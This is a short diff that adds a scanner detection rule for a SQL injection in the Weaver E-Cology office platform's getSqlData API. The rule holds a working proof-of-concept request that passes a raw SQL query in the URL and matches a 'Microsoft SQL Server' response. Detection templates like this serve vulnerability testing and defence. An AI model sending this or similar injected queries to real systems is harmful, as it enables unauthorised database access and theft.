@@ -1,0 +1,11 @@
+name: 泛微E-Cology-getdata-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version
+    expression:
+      status: 200
+      body_all: ["Microsoft SQL Server"]
